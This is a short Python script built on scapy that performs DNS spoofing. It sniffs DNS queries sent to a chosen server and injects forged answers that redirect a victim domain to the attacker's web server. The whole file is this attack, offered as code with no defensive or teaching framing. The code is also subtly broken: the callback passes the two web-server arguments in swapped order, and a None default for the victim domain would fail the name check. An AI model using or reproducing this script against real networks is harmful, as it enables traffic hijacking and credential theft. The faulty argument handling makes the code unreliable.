from scapy.all import DNS, DNSQR, DNSRR, IP, send, sniff, sr1, UDP

def dns_response(pkt, dns_server_ip, interface, victim_webserver, my_webserver):
    if DNS in pkt and pkt[DNS].opcode == 0 and pkt[DNS].ancount == 0 and victim_webserver in str(pkt["DNS Question Record"].qname):
        forged_resp = IP(dst = pkt[IP].src)/UDP(dport = pkt[UDP].sport, sport = 53)/DNS(id = pkt[DNS].id, ancount = 1, an = DNSRR(rrname = victim_webserver, rdata = my_webserver))
        send(forged_resp, verbose = 0, iface = interface)
        print("Sent forged response")


def dns_attack(dns_server_ip, interface, my_webserver, victim_webserver=None):
    bpf_filter = f'udp port 53 and ip dst {dns_server_ip}'

    sniff(filter = bpf_filter, prn = lambda pkt: dns_response(pkt, dns_server_ip, interface, my_webserver, victim_webserver), iface = interface)